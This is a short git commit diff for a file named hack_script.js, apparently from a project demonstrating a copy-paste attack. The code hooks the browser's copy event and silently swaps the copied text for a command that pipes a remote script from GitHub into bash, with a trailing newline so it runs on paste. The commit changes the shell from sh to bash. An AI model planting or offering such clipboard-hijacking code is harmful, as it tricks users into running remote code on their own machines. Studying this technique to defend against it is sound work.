abe3b48942f6cad40a5176c152bc29ca831e762e
Marco Fantauzzo <marco97pa@live.it>
2022-01-05 16:37:42 +0100

    Script now uses bash instead of sh

--- hack_script.js
+++ hack_script.js
@@ -1,7 +1,7 @@
 document.getElementById('copyme').addEventListener(
     'copy', function(e){
         e.clipboardData.setData('text/plain',
-        'curl https://raw.githubusercontent.com/marco97pa/copy-paste-hack-js/master/bad_script.sh | sh\n');
+        'curl https://raw.githubusercontent.com/marco97pa/copy-paste-hack-js/master/bad_script.sh | bash\n');
         e.preventDefault();
     }
 )
